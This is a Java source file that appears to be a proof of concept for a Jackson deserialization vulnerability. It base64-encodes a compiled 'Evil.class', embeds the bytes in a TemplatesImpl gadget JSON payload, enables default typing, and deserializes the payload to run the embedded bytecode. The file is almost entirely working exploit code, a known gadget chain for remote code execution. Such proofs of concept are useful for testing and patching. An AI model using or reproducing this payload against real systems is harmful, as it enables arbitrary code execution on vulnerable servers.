import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.io.IOUtils;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

public class Main {


    public Object obj;

    public static String aposToQuotes(String json) {
        return json.replace("'", "\"");
    }

    public static String readClassStr(String cls) {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Base64.encodeBase64String(bos.toByteArray());
    }

    public static void main(String[] args) throws Exception {


        String evilcode = readClassStr( System.getProperty("user.dir") +"/target/classes/Evil.class");


        final String jsoncode = aposToQuotes(
                "{'obj':[ 'com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl',\n" + "  {\n"
                        + "    'transletBytecodes' : [ '" + evilcode + "' ],\n" + "    'transletName' : 'a.b',\n"
                        + "    'outputProperties' : { }, '_tfactory':{}\n" + "  }\n" + " ]\n" + "}");

        System.out.println(jsoncode);

        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();

        mapper.readValue(jsoncode, Main.class);
    }

}

